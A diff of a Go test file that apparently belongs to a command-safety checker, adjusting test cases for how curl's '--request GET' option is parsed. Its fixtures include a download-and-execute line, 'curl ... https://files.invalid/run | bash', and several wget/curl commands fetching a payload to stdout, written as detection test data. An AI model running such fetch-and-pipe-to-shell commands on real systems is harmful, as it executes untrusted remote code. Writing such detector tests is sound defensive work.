@@ -126,7 +126,7 @@ func TestExactPipelineSourceStdoutBoundaries(t *testing.T) {
 		{name: "curl joined HEAD", program: "curl", argv: []string{"curl", "--request=HEAD", "https://files.invalid/payload"}},
 		{name: "curl bundled HEAD", program: "curl", argv: []string{"curl", "-sI", "https://files.invalid/payload"}},
 		{name: "curl unknown option", program: "curl", argv: []string{"curl", "--future-mode", "https://files.invalid/payload"}},
-		{name: "curl final GET overrides HEAD", program: "curl", argv: []string{"curl", "-XHEAD", "--request=GET", "https://files.invalid/payload"}, want: true},
+		{name: "curl final GET overrides HEAD", program: "curl", argv: []string{"curl", "-XHEAD", "--request", "GET", "https://files.invalid/payload"}, want: true},
 		{name: "wget bundled stdout", program: "wget", argv: []string{"wget", "-qO-", "https://files.invalid/payload"}, want: true},
 		{name: "wget bundled server response stdout", program: "wget", argv: []string{"wget", "-SO-", "https://files.invalid/payload"}, want: true},
 		{name: "wget short stdout", program: "wget", argv: []string{"wget", "-O-", "https://files.invalid/payload"}, want: true},
@@ -275,7 +275,7 @@ func TestStdinInterpreterPipelineAuthorityBoundaries(t *testing.T) {
 		},
 		{
 			name:              "curl final GET response to bash",
-			command:           "curl -XHEAD --request=GET https://files.invalid/run | bash",
+			command:           "curl -XHEAD --request GET https://files.invalid/run | bash",
 			prerequisite:      curlDownloadExecPrerequisite,
 			wantAuthoritative: true,
 			wantProof:         true,
